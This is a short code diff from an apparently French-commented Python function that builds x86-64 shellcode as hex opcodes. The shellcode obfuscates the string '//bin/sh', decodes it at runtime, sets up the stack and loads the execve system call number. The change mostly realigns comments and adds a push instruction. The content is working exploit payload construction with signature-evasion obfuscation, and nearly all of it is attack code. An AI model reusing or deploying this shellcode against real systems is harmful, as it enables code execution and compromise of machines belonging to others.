@@ -401,18 +401,20 @@ def shell():
     #Inverse en mirroir tout la chaine pour op code
     offuString = offuString[::-1]
 
-    PAYLOAD += "48bb"       #mov rbx, ...
+    PAYLOAD += "48bb"       #   mov rbx, ...
     PAYLOAD+=offuString     #.../bin/bash format hexa, offusqué
     #Déoffucation
     PAYLOAD += deOffus(factorOffusVar, "0x68732f6e69622f2f") 
 
-    PAYLOAD+="4889e7" # mov rdi, rsp
-    PAYLOAD+="50" #push rax
-    PAYLOAD+="57" #push rdi
-    PAYLOAD+="4889e6" #mov rsi, rsp
+    PAYLOAD+="5053"         #   push rax push rbx
+
+    PAYLOAD+="4889e7"       #   mov rdi, rsp
+    PAYLOAD+="50"           #   push rax
+    PAYLOAD+="57"           #   push rdi
+    PAYLOAD+="4889e6"       #   mov rsi, rsp
   
     #Appel systeme
-    PAYLOAD+="b03b" #mov al, 0x3b
+    PAYLOAD+="b03b"         #   mov al, 0x3b
     PAYLOAD+= call()
 
 """
